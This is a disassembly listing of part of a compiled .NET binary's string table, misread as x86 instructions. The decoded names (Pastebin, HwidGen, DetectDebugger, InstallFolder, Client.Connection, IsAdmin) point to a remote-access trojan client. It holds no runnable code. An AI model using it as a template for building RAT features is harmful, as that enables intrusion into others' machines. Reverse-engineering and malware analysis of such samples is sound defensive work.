  40876e:	73 4e                	jae    0x4087be
  408770:	75 6c                	jne    0x4087de
  408772:	6c                   	insb   (%dx),%es:(%edi)
  408773:	00 4d 75             	add    %cl,0x75(%ebp)
  408776:	74 65                	je     0x4087dd
  408778:	78 43                	js     0x4087bd
  40877a:	6f                   	outsl  %ds:(%esi),(%dx)
  40877b:	6e                   	outsb  %ds:(%esi),(%dx)
  40877c:	74 72                	je     0x4087f0
  40877e:	6f                   	outsl  %ds:(%esi),(%dx)
  40877f:	6c                   	insb   (%dx),%es:(%edi)
  408780:	00 45 6e             	add    %al,0x6e(%ebp)
  408783:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408786:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  40878a:	72 65                	jb     0x4087f1
  40878c:	61                   	popa
  40878d:	6d                   	insl   (%dx),%es:(%edi)
  40878e:	00 46 69             	add    %al,0x69(%esi)
  408791:	6c                   	insb   (%dx),%es:(%edi)
  408792:	65 53                	gs push %ebx
  408794:	74 72                	je     0x408808
  408796:	65 61                	gs popa
  408798:	6d                   	insl   (%dx),%es:(%edi)
  408799:	00 4e 65             	add    %cl,0x65(%esi)
  40879c:	74 77                	je     0x408815
  40879e:	6f                   	outsl  %ds:(%esi),(%dx)
  40879f:	72 6b                	jb     0x40880c
  4087a1:	53                   	push   %ebx
  4087a2:	74 72                	je     0x408816
  4087a4:	65 61                	gs popa
  4087a6:	6d                   	insl   (%dx),%es:(%edi)
  4087a7:	00 53 73             	add    %dl,0x73(%ebx)
  4087aa:	6c                   	insb   (%dx),%es:(%edi)
  4087ab:	53                   	push   %ebx
  4087ac:	74 72                	je     0x408820
  4087ae:	65 61                	gs popa
  4087b0:	6d                   	insl   (%dx),%es:(%edi)
  4087b1:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b6:	64 65 46             	fs gs inc %esi
  4087b9:	72 6f                	jb     0x40882a
  4087bb:	6d                   	insl   (%dx),%es:(%edi)
  4087bc:	53                   	push   %ebx
  4087bd:	74 72                	je     0x408831
  4087bf:	65 61                	gs popa
  4087c1:	6d                   	insl   (%dx),%es:(%edi)
  4087c2:	00 43 72             	add    %al,0x72(%ebx)
  4087c5:	79 70                	jns    0x408837
  4087c7:	74 6f                	je     0x408838
  4087c9:	53                   	push   %ebx
  4087ca:	74 72                	je     0x40883e
  4087cc:	65 61                	gs popa
  4087ce:	6d                   	insl   (%dx),%es:(%edi)
  4087cf:	00 47 5a             	add    %al,0x5a(%edi)
  4087d2:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087d9:	6d                   	insl   (%dx),%es:(%edi)
  4087da:	00 4d 65             	add    %cl,0x65(%ebp)
  4087dd:	6d                   	insl   (%dx),%es:(%edi)
  4087de:	6f                   	outsl  %ds:(%esi),(%dx)
  4087df:	72 79                	jb     0x40885a
  4087e1:	53                   	push   %ebx
  4087e2:	74 72                	je     0x408856
  4087e4:	65 61                	gs popa
  4087e6:	6d                   	insl   (%dx),%es:(%edi)
  4087e7:	00 50 72             	add    %dl,0x72(%eax)
  4087ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4087eb:	67 72 61             	addr16 jb 0x40884f
  4087ee:	6d                   	insl   (%dx),%es:(%edi)
  4087ef:	00 67 65             	add    %ah,0x65(%edi)
  4087f2:	74 5f                	je     0x408853
  4087f4:	49                   	dec    %ecx
  4087f5:	74 65                	je     0x40885c
  4087f7:	6d                   	insl   (%dx),%es:(%edi)
  4087f8:	00 67 65             	add    %ah,0x65(%edi)
  4087fb:	74 5f                	je     0x40885c
  4087fd:	49                   	dec    %ecx
  4087fe:	73 36                	jae    0x408836
  408800:	34 42                	xor    $0x42,%al
  408802:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408809:	74 
  40880a:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408811:	65 6d                	gs insl (%dx),%es:(%edi)
  408813:	00 43 6c             	add    %al,0x6c(%ebx)
  408816:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40881d:	67 6f                	outsl  %ds:(%si),(%dx)
  40881f:	72 69                	jb     0x40888a
  408821:	74 68                	je     0x40888b
  408823:	6d                   	insl   (%dx),%es:(%edi)
  408824:	00 53 79             	add    %dl,0x79(%ebx)
  408827:	6d                   	insl   (%dx),%es:(%edi)
  408828:	6d                   	insl   (%dx),%es:(%edi)
  408829:	65 74 72             	gs je  0x40889e
  40882c:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408833:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40883a:	79 
  40883b:	6d                   	insl   (%dx),%es:(%edi)
  40883c:	6d                   	insl   (%dx),%es:(%edi)
  40883d:	65 74 72             	gs je  0x4088b2
  408840:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408847:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40884e:	73 
  40884f:	68 41 6c 67 6f       	push   $0x6f676c41
  408854:	72 69                	jb     0x4088bf
  408856:	74 68                	je     0x4088c0
  408858:	6d                   	insl   (%dx),%es:(%edi)
  408859:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40885d:	6d                   	insl   (%dx),%es:(%edi)
  40885e:	00 52 61             	add    %dl,0x61(%edx)
  408861:	6e                   	outsb  %ds:(%esi),(%dx)
  408862:	64 6f                	outsl  %fs:(%esi),(%dx)
  408864:	6d                   	insl   (%dx),%es:(%edi)
  408865:	00 49 43             	add    %cl,0x43(%ecx)
  408868:	72 79                	jb     0x4088e3
  40886a:	70 74                	jo     0x4088e0
  40886c:	6f                   	outsl  %ds:(%esi),(%dx)
  40886d:	54                   	push   %esp
  40886e:	72 61                	jb     0x4088d1
  408870:	6e                   	outsb  %ds:(%esi),(%dx)
  408871:	73 66                	jae    0x4088d9
  408873:	6f                   	outsl  %ds:(%esi),(%dx)
  408874:	72 6d                	jb     0x4088e3
  408876:	00 4d 73             	add    %cl,0x73(%ebp)
  408879:	67 50                	addr16 push %eax
  40887b:	61                   	popa
  40887c:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40887f:	6e                   	outsb  %ds:(%esi),(%dx)
  408880:	75 6d                	jne    0x4088ef
  408882:	00 57 72             	add    %dl,0x72(%edi)
  408885:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  40888c:	65 
  40888d:	61                   	popa
  40888e:	6e                   	outsb  %ds:(%esi),(%dx)
  40888f:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408893:	6f                   	outsl  %ds:(%esi),(%dx)
  408894:	6f                   	outsl  %ds:(%esi),(%dx)
  408895:	6c                   	insb   (%dx),%es:(%edi)
  408896:	65 61                	gs popa
  408898:	6e                   	outsb  %ds:(%esi),(%dx)
  408899:	00 53 65             	add    %dl,0x65(%ebx)
  40889c:	74 41                	je     0x4088df
  40889e:	73 42                	jae    0x4088e2
  4088a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a2:	6c                   	insb   (%dx),%es:(%edi)
  4088a3:	65 61                	gs popa
  4088a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a6:	00 48 77             	add    %cl,0x77(%eax)
  4088a9:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b0:	65 
  4088b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b2:	00 63 68             	add    %ah,0x68(%ebx)
  4088b5:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088bc:	4d 
  4088bd:	61                   	popa
  4088be:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c5:	43                   	inc    %ebx
  4088c6:	68 61 69 6e 00       	push   $0x6e6961
  4088cb:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088ce:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d6:	6d                   	insl   (%dx),%es:(%edi)
  4088d7:	61                   	popa
  4088d8:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088df:	43                   	inc    %ebx
  4088e0:	75 72                	jne    0x408954
  4088e2:	72 65                	jb     0x408949
  4088e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e5:	74 44                	je     0x40892b
  4088e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e8:	6d                   	insl   (%dx),%es:(%edi)
  4088e9:	61                   	popa
  4088ea:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f1:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f5:	00 49 73             	add    %cl,0x73(%ecx)
  4088f8:	41                   	inc    %ecx
  4088f9:	64 6d                	fs insl (%dx),%es:(%edi)
  4088fb:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408902:	00 47 65             	add    %al,0x65(%edi)
  408905:	74 46                	je     0x40894d
  408907:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40890e:	57 
  40890f:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408916:	78 
  408917:	74 65                	je     0x40897e
  408919:	6e                   	outsb  %ds:(%esi),(%dx)
  40891a:	73 69                	jae    0x408985
  40891c:	6f                   	outsl  %ds:(%esi),(%dx)
  40891d:	6e                   	outsb  %ds:(%esi),(%dx)
  40891e:	00 67 65             	add    %ah,0x65(%edi)
  408921:	74 5f                	je     0x408982
  408923:	4f                   	dec    %edi
  408924:	53                   	push   %ebx
  408925:	56                   	push   %esi
  408926:	65 72 73             	gs jb  0x40899c
  408929:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408930:	74 65                	je     0x408997
  408932:	6d                   	insl   (%dx),%es:(%edi)
  408933:	2e 49                	cs dec %ecx
  408935:	4f                   	dec    %edi
  408936:	2e 43                	cs inc %ebx
  408938:	6f                   	outsl  %ds:(%esi),(%dx)
  408939:	6d                   	insl   (%dx),%es:(%edi)
  40893a:	70 72                	jo     0x4089ae
  40893c:	65 73 73             	gs jae 0x4089b2
  40893f:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408946:	6c                   	insb   (%dx),%es:(%edi)
  408947:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40894e:	00 53 79             	add    %dl,0x79(%ebx)
  408951:	73 74                	jae    0x4089c7
  408953:	65 6d                	gs insl (%dx),%es:(%edi)
  408955:	2e 53                	cs push %ebx
  408957:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40895b:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408962:	68 
  408963:	65 6e                	outsb  %gs:(%esi),(%dx)
  408965:	74 69                	je     0x4089d0
  408967:	63 61 74             	arpl   %esp,0x74(%ecx)
  40896a:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408971:	74 65                	je     0x4089d8
  408973:	6d                   	insl   (%dx),%es:(%edi)
  408974:	2e 52                	cs push %edx
  408976:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408979:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40897e:	6e                   	outsb  %ds:(%esi),(%dx)
  40897f:	00 58 35             	add    %bl,0x35(%eax)
  408982:	30 39                	xor    %bh,(%ecx)
  408984:	43                   	inc    %ebx
  408985:	65 72 74             	gs jb  0x4089fc
  408988:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40898f:	43                   	inc    %ebx
  408990:	6f                   	outsl  %ds:(%esi),(%dx)
  408991:	6c                   	insb   (%dx),%es:(%edi)
  408992:	6c                   	insb   (%dx),%es:(%edi)
  408993:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408998:	6e                   	outsb  %ds:(%esi),(%dx)
  408999:	00 4d 61             	add    %cl,0x61(%ebp)
  40899c:	6e                   	outsb  %ds:(%esi),(%dx)
  40899d:	61                   	popa
  40899e:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a3:	74 4f                	je     0x4089f4
  4089a5:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a8:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089ac:	6c                   	insb   (%dx),%es:(%edi)
  4089ad:	6c                   	insb   (%dx),%es:(%edi)
  4089ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b4:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b7:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089be:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c6:	00 73 65             	add    %dh,0x65(%ebx)
  4089c9:	74 5f                	je     0x408a2a
  4089cb:	50                   	push   %eax
  4089cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cd:	73 69                	jae    0x408a38
  4089cf:	74 69                	je     0x408a3a
  4089d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d3:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d6:	73 69                	jae    0x408a41
  4089d8:	74 69                	je     0x408a43
  4089da:	6f                   	outsl  %ds:(%esi),(%dx)
  4089db:	6e                   	outsb  %ds:(%esi),(%dx)
  4089dc:	00 43 72             	add    %al,0x72(%ebx)
  4089df:	79 70                	jns    0x408a51
  4089e1:	74 6f                	je     0x408a52
  4089e3:	67 72 61             	addr16 jb 0x408a47
  4089e6:	70 68                	jo     0x408a50
  4089e8:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089ef:	74 69                	je     0x408a5a
  4089f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f3:	00 41 72             	add    %al,0x72(%ecx)
  4089f6:	67 75 6d             	addr16 jne 0x408a66
  4089f9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089fb:	74 4e                	je     0x408a4b
  4089fd:	75 6c                	jne    0x408a6b
  4089ff:	6c                   	insb   (%dx),%es:(%edi)
  408a00:	45                   	inc    %ebp
  408a01:	78 63                	js     0x408a66
  408a03:	65 70 74             	gs jo  0x408a7a
  408a06:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a0d:	75 6d                	jne    0x408a7c
  408a0f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a11:	74 45                	je     0x408a58
  408a13:	78 63                	js     0x408a78
  408a15:	65 70 74             	gs jo  0x408a8c
  408a18:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a1f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a20:	6f                   	outsl  %ds:(%esi),(%dx)
  408a21:	77 6e                	ja     0x408a91
  408a23:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a26:	61                   	popa
  408a27:	67 65 43             	addr16 gs inc %ebx
  408a2a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2b:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a30:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a32:	00 53 65             	add    %dl,0x65(%ebx)
  408a35:	6e                   	outsb  %ds:(%esi),(%dx)
  408a36:	64 49                	fs dec %ecx
  408a38:	6e                   	outsb  %ds:(%esi),(%dx)
  408a39:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3b:	00 46 69             	add    %al,0x69(%esi)
  408a3e:	6c                   	insb   (%dx),%es:(%edi)
  408a3f:	65 49                	gs dec %ecx
  408a41:	6e                   	outsb  %ds:(%esi),(%dx)
  408a42:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a44:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a48:	76 65                	jbe    0x408aaf
  408a4a:	49                   	dec    %ecx
  408a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4e:	00 46 69             	add    %al,0x69(%esi)
  408a51:	6c                   	insb   (%dx),%es:(%edi)
  408a52:	65 53                	gs push %ebx
  408a54:	79 73                	jns    0x408ac9
  408a56:	74 65                	je     0x408abd
  408a58:	6d                   	insl   (%dx),%es:(%edi)
  408a59:	49                   	dec    %ecx
  408a5a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a5b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5d:	00 43 6f             	add    %al,0x6f(%ebx)
  408a60:	6d                   	insl   (%dx),%es:(%edi)
  408a61:	70 75                	jo     0x408ad8
  408a63:	74 65                	je     0x408aca
  408a65:	72 49                	jb     0x408ab0
  408a67:	6e                   	outsb  %ds:(%esi),(%dx)
  408a68:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6a:	00 43 53             	add    %al,0x53(%ebx)
  408a6d:	68 61 72 70 41       	push   $0x41707261
  408a72:	72 67                	jb     0x408adb
  408a74:	75 6d                	jne    0x408ae3
  408a76:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a78:	74 49                	je     0x408ac3
  408a7a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a7d:	00 50 72             	add    %dl,0x72(%eax)
  408a80:	6f                   	outsl  %ds:(%esi),(%dx)
  408a81:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a84:	73 53                	jae    0x408ad9
  408a86:	74 61                	je     0x408ae9
  408a88:	72 74                	jb     0x408afe
  408a8a:	49                   	dec    %ecx
  408a8b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a8e:	00 57 72             	add    %dl,0x72(%edi)
  408a91:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a98:	50 
  408a99:	72 65                	jb     0x408b00
  408a9b:	76 65                	jbe    0x408b02
  408a9d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9e:	74 53                	je     0x408af3
  408aa0:	6c                   	insb   (%dx),%es:(%edi)
  408aa1:	65 65 70 00          	gs gs jo 0x408aa5
  408aa5:	5a                   	pop    %edx
  408aa6:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aad:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aaf:	74 41                	je     0x408af2
  408ab1:	70 70                	jo     0x408b23
  408ab3:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab6:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ab9:	73 6f                	jae    0x408b2a
  408abb:	66 74 2e             	data16 je 0x408aec
  408abe:	43                   	inc    %ebx
  408abf:	53                   	push   %ebx
  408ac0:	68 61 72 70 00       	push   $0x707261
  408ac5:	47                   	inc    %edi
  408ac6:	72 6f                	jb     0x408b37
  408ac8:	75 70                	jne    0x408b3a
  408aca:	00 4e 6f             	add    %cl,0x6f(%esi)
  408acd:	72 6d                	jb     0x408b3c
  408acf:	61                   	popa
  408ad0:	6c                   	insb   (%dx),%es:(%edi)
  408ad1:	53                   	push   %ebx
  408ad2:	74 61                	je     0x408b35
  408ad4:	72 74                	jb     0x408b4a
  408ad6:	75 70                	jne    0x408b48
  408ad8:	00 53 79             	add    %dl,0x79(%ebx)
  408adb:	73 74                	jae    0x408b51
  408add:	65 6d                	gs insl (%dx),%es:(%edi)
  408adf:	2e 4c                	cs dec %esp
  408ae1:	69 6e 71 00 57 69 6e 	imul   $0x6e695700,0x71(%esi),%ebp
  408ae8:	52                   	push   %edx
  408ae9:	61                   	popa
  408aea:	72 00                	jb     0x408aec
  408aec:	43                   	inc    %ebx
  408aed:	6c                   	insb   (%dx),%es:(%edi)
  408aee:	65 61                	gs popa
  408af0:	72 00                	jb     0x408af2
  408af2:	43                   	inc    %ebx
  408af3:	68 61 72 00 49       	push   $0x49007261
  408af8:	6e                   	outsb  %ds:(%esi),(%dx)
  408af9:	76 6f                	jbe    0x408b6a
  408afb:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408aff:	6d                   	insl   (%dx),%es:(%edi)
  408b00:	62 65 72             	bound  %esp,0x72(%ebp)
  408b03:	00 4d 44             	add    %cl,0x44(%ebp)
  408b06:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b0b:	74 6f                	je     0x408b7c
  408b0d:	53                   	push   %ebx
  408b0e:	65 72 76             	gs jb  0x408b87
  408b11:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b18:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b1f:	41 
  408b20:	43                   	inc    %ebx
  408b21:	72 79                	jb     0x408b9c
  408b23:	70 74                	jo     0x408b99
  408b25:	6f                   	outsl  %ds:(%esi),(%dx)
  408b26:	53                   	push   %ebx
  408b27:	65 72 76             	gs jb  0x408ba0
  408b2a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b31:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b38:	73 
  408b39:	43                   	inc    %ebx
  408b3a:	72 79                	jb     0x408bb5
  408b3c:	70 74                	jo     0x408bb2
  408b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3f:	53                   	push   %ebx
  408b40:	65 72 76             	gs jb  0x408bb9
  408b43:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b4a:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b51:	72 
  408b52:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b59:	64 65 72 00          	fs gs jb 0x408b5d
  408b5d:	49                   	dec    %ecx
  408b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5f:	73 74                	jae    0x408bd5
  408b61:	61                   	popa
  408b62:	6c                   	insb   (%dx),%es:(%edi)
  408b63:	6c                   	insb   (%dx),%es:(%edi)
  408b64:	46                   	inc    %esi
  408b65:	6f                   	outsl  %ds:(%esi),(%dx)
  408b66:	6c                   	insb   (%dx),%es:(%edi)
  408b67:	64 65 72 00          	fs gs jb 0x408b6b
  408b6b:	49                   	dec    %ecx
  408b6c:	64 53                	fs push %ebx
  408b6e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b70:	64 65 72 00          	fs gs jb 0x408b74
  408b74:	73 65                	jae    0x408bdb
  408b76:	6e                   	outsb  %ds:(%esi),(%dx)
  408b77:	64 65 72 00          	fs gs jb 0x408b7b
  408b7b:	4d                   	dec    %ebp
  408b7c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b83:	74 2e                	je     0x408bb3
  408b85:	43                   	inc    %ebx
  408b86:	53                   	push   %ebx
  408b87:	68 61 72 70 2e       	push   $0x2e707261
  408b8c:	52                   	push   %edx
  408b8d:	75 6e                	jne    0x408bfd
  408b8f:	74 69                	je     0x408bfa
  408b91:	6d                   	insl   (%dx),%es:(%edi)
  408b92:	65 42                	gs inc %edx
  408b94:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b9b:	61                   	popa
  408b9c:	6c                   	insb   (%dx),%es:(%edi)
  408b9d:	6c                   	insb   (%dx),%es:(%edi)
  408b9e:	53                   	push   %ebx
  408b9f:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408ba6:	65 
  408ba7:	72 00                	jb     0x408ba9
  408ba9:	47                   	inc    %edi
  408baa:	65 74 45             	gs je  0x408bf2
  408bad:	6e                   	outsb  %ds:(%esi),(%dx)
  408bae:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bb1:	65 72 00             	gs jb  0x408bb4
  408bb4:	67 65 74 5f          	addr16 gs je 0x408c17
  408bb8:	42                   	inc    %edx
  408bb9:	75 66                	jne    0x408c21
  408bbb:	66 65 72 00          	data16 gs jb 0x408bbf
  408bbf:	73 65                	jae    0x408c26
  408bc1:	74 5f                	je     0x408c22
  408bc3:	42                   	inc    %edx
  408bc4:	75 66                	jne    0x408c2c
  408bc6:	66 65 72 00          	data16 gs jb 0x408bca
  408bca:	57                   	push   %edi
  408bcb:	72 69                	jb     0x408c36
  408bcd:	74 65                	je     0x408c34
  408bcf:	49                   	dec    %ecx
  408bd0:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd1:	74 65                	je     0x408c38
  408bd3:	67 65 72 00          	addr16 gs jb 0x408bd7
  408bd7:	67 65 74 5f          	addr16 gs je 0x408c3a
  408bdb:	41                   	inc    %ecx
  408bdc:	73 49                	jae    0x408c27
  408bde:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdf:	74 65                	je     0x408c46
  408be1:	67 65 72 00          	addr16 gs jb 0x408be5
  408be5:	73 65                	jae    0x408c4c
  408be7:	74 5f                	je     0x408c48
  408be9:	41                   	inc    %ecx
  408bea:	73 49                	jae    0x408c35
  408bec:	6e                   	outsb  %ds:(%esi),(%dx)
  408bed:	74 65                	je     0x408c54
  408bef:	67 65 72 00          	addr16 gs jb 0x408bf3
  408bf3:	47                   	inc    %edi
  408bf4:	65 74 41             	gs je  0x408c38
  408bf7:	73 49                	jae    0x408c42
  408bf9:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfa:	74 65                	je     0x408c61
  408bfc:	67 65 72 00          	addr16 gs jb 0x408c00
  408c00:	53                   	push   %ebx
  408c01:	65 74 41             	gs je  0x408c45
  408c04:	73 49                	jae    0x408c4f
  408c06:	6e                   	outsb  %ds:(%esi),(%dx)
  408c07:	74 65                	je     0x408c6e
  408c09:	67 65 72 00          	addr16 gs jb 0x408c0d
  408c0d:	44                   	inc    %esp
  408c0e:	65 74 65             	gs je  0x408c76
  408c11:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c15:	62 75 67             	bound  %esi,0x67(%ebp)
  408c18:	67 65 72 00          	addr16 gs jb 0x408c1c
  408c1c:	4d                   	dec    %ebp
  408c1d:	61                   	popa
  408c1e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1f:	61                   	popa
  408c20:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c23:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c25:	74 4f                	je     0x408c76
  408c27:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c2a:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c2e:	61                   	popa
  408c2f:	72 63                	jb     0x408c94
  408c31:	68 65 72 00 53       	push   $0x53007265
  408c36:	65 73 73             	gs jae 0x408cac
  408c39:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c40:	6e                   	outsb  %ds:(%esi),(%dx)
  408c41:	67 45                	addr16 inc %ebp
  408c43:	76 65                	jbe    0x408caa
  408c45:	6e                   	outsb  %ds:(%esi),(%dx)
  408c46:	74 48                	je     0x408c90
  408c48:	61                   	popa
  408c49:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4a:	64 6c                	fs insb (%dx),%es:(%edi)
  408c4c:	65 72 00             	gs jb  0x408c4f
  408c4f:	54                   	push   %esp
  408c50:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c57:	6e                   	outsb  %ds:(%esi),(%dx)
  408c58:	65 72 00             	gs jb  0x408c5b
  408c5b:	43                   	inc    %ebx
  408c5c:	6c                   	insb   (%dx),%es:(%edi)
  408c5d:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c64:	6c                   	insb   (%dx),%es:(%edi)
  408c65:	70 65                	jo     0x408ccc
  408c67:	72 00                	jb     0x408c69
  408c69:	54                   	push   %esp
  408c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6b:	55                   	push   %ebp
  408c6c:	70 70                	jo     0x408cde
  408c6e:	65 72 00             	gs jb  0x408c71
  408c71:	44                   	inc    %esp
  408c72:	65 74 65             	gs je  0x408cda
  408c75:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c79:	6e                   	outsb  %ds:(%esi),(%dx)
  408c7a:	75 66                	jne    0x408ce2
  408c7c:	61                   	popa
  408c7d:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c81:	65 72 00             	gs jb  0x408c84
  408c84:	43                   	inc    %ebx
  408c85:	75 72                	jne    0x408cf9
  408c87:	72 65                	jb     0x408cee
  408c89:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8a:	74 55                	je     0x408ce1
  408c8c:	73 65                	jae    0x408cf3
  408c8e:	72 00                	jb     0x408c90
  408c90:	53                   	push   %ebx
